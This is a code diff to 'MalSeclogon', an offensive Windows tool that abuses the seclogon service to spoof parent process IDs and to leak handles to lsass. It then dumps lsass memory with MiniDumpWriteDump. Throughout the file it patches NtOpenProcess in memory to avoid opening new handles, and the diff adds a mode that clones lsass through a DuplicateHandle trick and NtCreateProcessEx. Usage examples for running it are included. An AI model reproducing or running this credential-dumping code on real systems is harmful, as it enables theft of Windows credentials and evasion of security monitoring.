@@ -13,7 +13,7 @@ void MalSeclogonPPIDSpoofing(int lsassPid, wchar_t* cmdline);
 void ReplaceNtOpenProcess(HANDLE leakedHandle, char* oldCode, int* oldCodeSize);
 void RestoreNtOpenProcess(char* oldCode, int oldCodeSize);
 void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath);
-void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath);
+void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath, BOOL useLsassClone);
 NTSTATUS QueryObjectTypesInfo(__out POBJECT_TYPES_INFORMATION* TypesInfo);
 NTSTATUS GetTypeIndexByName(__in PCUNICODE_STRING TypeName, __out PULONG TypeIndex);
 BOOL FileExists(LPCTSTR szPath);
@@ -21,17 +21,15 @@ BOOL FileExists(LPCTSTR szPath);
 int wmain(int argc, wchar_t** argv)
 {
 	int targetPid = -1;
-	BOOL dumpLsass = FALSE;
-	BOOL handlesLeaked = FALSE;
+	DWORD lsassDumpType = 0;
+	BOOL handlesLeaked = FALSE, useLsassClone = FALSE;
 	wchar_t defaultDumpPath[] = L"C:\\lsass.dmp";
 	wchar_t defaultCmdline[] = L"cmd.exe";
 	wchar_t* dumpPath = defaultDumpPath;
 	wchar_t* cmdline = defaultCmdline;
-
 	int cnt = 1;
 	while ((argc > 1) && (argv[cnt][0] == '-'))
 	{
-
 		switch (argv[cnt][1])
 		{
 			case 'p':
@@ -43,8 +41,8 @@ int wmain(int argc, wchar_t** argv)
 			case 'd':
 				++cnt;
 				--argc;
-				if(argv[cnt] == L'\0') goto DefaultLabel;
-				dumpLsass = TRUE;
+				if (argv[cnt] == L'\0') goto DefaultLabel;
+				lsassDumpType = _wtoi(argv[cnt]);
 				break;
 
 			case 'o':
@@ -68,6 +66,7 @@ int wmain(int argc, wchar_t** argv)
 			case 'h':
 				usage();
 				exit(0);
+
 		DefaultLabel:
 			default:
 				printf("Wrong Argument: %S\n", argv[cnt]);
@@ -83,16 +82,16 @@ int wmain(int argc, wchar_t** argv)
 		exit(-1);
 	}
 
-	if (dumpLsass) {
+	if (lsassDumpType == 2) useLsassClone = TRUE;
+	if (lsassDumpType == 1 || lsassDumpType == 2) {
 		if (handlesLeaked)
-			MalSeclogonDumpLsassFromLeakedHandles(targetPid, dumpPath);
+			MalSeclogonDumpLsassFromLeakedHandles(targetPid, dumpPath, useLsassClone);
 		else
 			MalSeclogonLeakHandles(targetPid, dumpPath);
 	}
 	else {
 		MalSeclogonPPIDSpoofing(targetPid, cmdline);
 	}
-
 	return 0;
 }
 
@@ -178,7 +177,7 @@ NTSTATUS QueryObjectTypesInfo(__out POBJECT_TYPES_INFORMATION* TypesInfo) {
 	do {
 		Buffer = malloc(BufferLength);
 		if (Buffer == NULL)
-			return STATUS_INSUFFICIENT_RESOURCES;
+			return (NTSTATUS)STATUS_INSUFFICIENT_RESOURCES;
 		Status = NtQueryObject(NULL, ObjectTypesInformation, Buffer, BufferLength, &BufferLength);
 		if (NT_SUCCESS(Status)) {
 			*TypesInfo = Buffer;
@@ -201,13 +200,13 @@ NTSTATUS GetTypeIndexByName(__in PCUNICODE_STRING TypeName, __out PULONG TypeInd
 		printf("QueryObjectTypesInfo failed: 0x%08x\n", Status);
 		return Status;
 	}
-	CurrentType = OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
+	CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
 	for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++) {
 		if (RtlCompareUnicodeString(TypeName, &CurrentType->TypeName, TRUE) == 0) {
 			*TypeIndex = i + 2;
 			break;
 		}
-		CurrentType = OBJECT_TYPES_NEXT_ENTRY(CurrentType);
+		CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
 	}
 	if (!*TypeIndex)
 		Status = STATUS_NOT_FOUND;
@@ -276,6 +275,10 @@ void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath) {
 	DWORD leakedHandlesCounter = 0;
 	EnableDebugPrivilege(TRUE);
 	FindProcessHandlesInLsass(lsassPid, handlesToLeak, &handlesToLeakCount);
+	if (handlesToLeakCount < 1) {
+		printf("No process handles to lsass found. The PID you specified does not seem to be the lsass pid.\n");
+		exit(-1);
+	}
 	// hacky thing to respawn the current process with different commandline. This should flag our next execution to contains leaked handles
 	StringCchPrintfW(newCmdline, MAX_PATH, cmdlineTemplate, GetCommandLine(), L"-l 1");
 	GetModuleFileName(NULL, moduleFilename, MAX_PATH);
@@ -289,7 +292,7 @@ void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath) {
 		startInfo.hStdInput = (HANDLE)handlesToLeak[leakedHandlesCounter++];
 		startInfo.hStdOutput = (HANDLE)handlesToLeak[leakedHandlesCounter++];
 		startInfo.hStdError = (HANDLE)handlesToLeak[leakedHandlesCounter++];
-		printf("Attempt to leak process handles from lsass: 0x%04x 0x%04x 0x%04x...\n", startInfo.hStdInput, startInfo.hStdOutput, startInfo.hStdError);
+		printf("Attempt to leak process handles from lsass: 0x%p 0x%p 0x%p...\n", startInfo.hStdInput, startInfo.hStdOutput, startInfo.hStdError);
 		if (!CreateProcessWithLogonW(L"not", L"valid", L"user", LOGON_NETCREDENTIALS_ONLY, moduleFilename, newCmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
 			printf("CreateProcessWithLogonW() failed with error code %d \n", GetLastError());
 			exit(-1);
@@ -316,12 +319,10 @@ void ReplaceNtOpenProcess(HANDLE leakedHandle, char* oldCode, int* oldCodeSize) 
 	*/
 	char replacedFunc[] = { 0x48, 0xC7, 0x01, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x31, 0xC0, 0xC3 };
 	DWORD oldProtection, oldProtection2;
-	char* addrNtOpenProcess = GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtOpenProcess");
+	char* addrNtOpenProcess = (char*)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtOpenProcess");
 	// we save old code to restore the original function
 	*oldCodeSize = sizeof(replacedFunc);
 	memcpy(oldCode, addrNtOpenProcess, *oldCodeSize);
-	// we ensure no one will close the handle, it seems RtlQueryProcessDebugInformation() try to close it
-	SetHandleInformation(leakedHandle, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE);
 	memcpy((replacedFunc + 3), (WORD*)&leakedHandle, sizeof(WORD));
 	VirtualProtect(addrNtOpenProcess, sizeof(replacedFunc), PAGE_EXECUTE_READWRITE, &oldProtection);
 	memcpy(addrNtOpenProcess, replacedFunc, sizeof(replacedFunc));
@@ -330,57 +331,82 @@ void ReplaceNtOpenProcess(HANDLE leakedHandle, char* oldCode, int* oldCodeSize) 
 
 void RestoreNtOpenProcess(char* oldCode, int oldCodeSize) {
 	DWORD oldProtection, oldProtection2;
-	char* addrNtOpenProcess = GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtOpenProcess");
+	char* addrNtOpenProcess = (char*)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtOpenProcess");
 	VirtualProtect(addrNtOpenProcess, oldCodeSize, PAGE_EXECUTE_READWRITE, &oldProtection);
 	memcpy(addrNtOpenProcess, oldCode, oldCodeSize);
 	VirtualProtect(addrNtOpenProcess, oldCodeSize, oldProtection, &oldProtection2);
 }
 
-
-void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath) {
-	int MiniDumpWithFullMemory = 0x00000002;
+void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath, BOOL useLsassClone) {
+	pMiniDumpWriteDump MiniDumpWriteDump = NULL;
+	pNtCreateProcessEx NtCreateProcessEx = NULL;
 	char oldCode[15];
 	int oldCodeSize;
+	HANDLE hLeakedHandleFullAccess = NULL, hLsassClone = NULL, hLsass = NULL;
 	RtlZeroMemory(oldCode, 15);
-	pMiniDumpWriteDump MiniDumpWriteDump = (pMiniDumpWriteDump)GetProcAddress(LoadLibrary(L"Dbghelp.dll"), "MiniDumpWriteDump");
+	MiniDumpWriteDump = (pMiniDumpWriteDump)GetProcAddress(LoadLibrary(L"Dbghelp.dll"), "MiniDumpWriteDump");
+	if (useLsassClone) NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtCreateProcessEx");
 	// now we expect to have leaked handles in our current process. Even if the seclogon can duplicate 3 handles at a time it seems it duplicates each one 2 times, so total handles = 6
 	for (__int64 leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4) {
 		if (GetProcessId((HANDLE)leakedHandle) == lsassPid) {
+			hLsass = NULL;
 			HANDLE hFileDmp = CreateFile(dumpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (useLsassClone) {
+				// the leaked handle does not have PROCESS_CREATE_PROCESS right so we cannot use it for NtCreateProcessEx call. Using a trick by @tiraniddo to get a handle with full access:
+				// "The DuplicateHandle system call has an interesting behaviour when using the pseudo current process handle, which has the value -1. Specifically if you try and duplicate the pseudo handle from another process you get back a full access handle to the source process."
+				// details here --> https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
+				DuplicateHandle((HANDLE)leakedHandle, (HANDLE)-1, GetCurrentProcess(), &hLeakedHandleFullAccess, 0, FALSE, DUPLICATE_SAME_ACCESS);
+				NTSTATUS status = NtCreateProcessEx(&hLsassClone, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, NULL, hLeakedHandleFullAccess, 0, NULL, NULL, NULL, FALSE);
+				if (status != 0) {
+					printf("NtCreateProcessEx failed with ntstatus 0x%08x", status);
+					exit(-1);
+				}
+				hLsass = hLsassClone;
+			}
+			else
+				hLsass = (HANDLE)leakedHandle;
+			// we ensure no one will close the handle, it seems RtlQueryProcessDebugInformation() try to close it
+			SetHandleInformation(hLsass, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE);
 			// we need to patch NtOpenProcess because MiniDumpWriteDump would open a new handle to lsass and we want to avoid that
-			ReplaceNtOpenProcess((HANDLE)leakedHandle, oldCode, &oldCodeSize);
-			BOOL result = MiniDumpWriteDump((HANDLE)leakedHandle, lsassPid, hFileDmp, MiniDumpWithFullMemory, NULL, NULL, NULL);
+			ReplaceNtOpenProcess((HANDLE)hLsass, oldCode, &oldCodeSize);
+			BOOL result = MiniDumpWriteDump((HANDLE)hLsass, GetProcessId(hLsass), hFileDmp, MiniDumpWithFullMemory, NULL, NULL, NULL);
 			RestoreNtOpenProcess(oldCode, oldCodeSize);
 			CloseHandle(hFileDmp);
+			// unprotect the handle for close
+			SetHandleInformation(hLsass, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0);
+			CloseHandle(hLsass);
 			if (result)
 				break;
 			else
 				DeleteFile(dumpPath);
 		}
-		// unprotect the handle for close
-		SetHandleInformation((HANDLE)leakedHandle, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0);
-		CloseHandle((HANDLE)leakedHandle);
+		else
+			CloseHandle((HANDLE)leakedHandle);
 	}
 }
 
 void usage()
 {
-	printf("\n\tMalSeclogon\n\t@splinter_code\n\n");
+	printf("\n\tMalSeclogon v0.1\n\t@splinter_code\n\n");
 	printf("Mandatory args: \n"
 		"-p Pid of the process to spoof the PPID through seclogon service\n"
 	);
 	printf("\n");
 	printf("Other args: \n"
-		"-d Dump lsass by using leaked handles\n"
+		"-d Dump lsass method\n"
+		"\t1 = Dump lsass by using leaked handles\n"
+		"\t2 = Dump lsass by using leaked handles and cloned lsass process\n"
 		"-o Output path of the dump (default C:\\lsass.dmp)\n"
 		"-c Commandline of the spoofed process, default: cmd.exe (not compatible with -d)\n"
 	);
 	printf("\n");
 	printf("Examples: \n"
-		"\n- Run a process with a spoofed PPID:\n"
+		"- Run a process with a spoofed PPID:\n"
 		"\tMalseclogon.exe -p [PPID] -c cmd.exe\n"
 		"- Dump lsass by using leaked handles:\n"
 		"\tMalseclogon.exe -p [lsassPid] -d 1\n"
+		"- Dump lsass by using leaked handles and cloned lsass process:\n"
+		"\tMalseclogon.exe -p [lsassPid] -d 2\n"
 	);
 	printf("\n");
 }
